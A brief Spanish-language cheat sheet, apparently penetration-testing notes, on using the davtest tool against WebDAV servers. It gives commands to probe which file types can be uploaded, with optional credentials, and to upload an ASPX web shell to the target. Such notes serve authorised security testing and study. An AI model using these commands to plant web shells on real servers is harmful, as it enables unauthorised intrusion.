### Testear el sitio para conocer que tipo de archivos se pueden subir:
$ davtest -url {URL}
### Con autenticación:
$ davtest -url {URL} -cleanup -auth {USER}:{PASSWORD}
### Carga un webshell:
$ davtest -url {URL} -cleanup -uploadfile ./shell.aspx -uploadloc shell.aspx
$ davtest -url {URL} -cleanup -auth {USER}:{PASSWORD} -uploadfile ./shell.aspx -uploadloc shell.aspx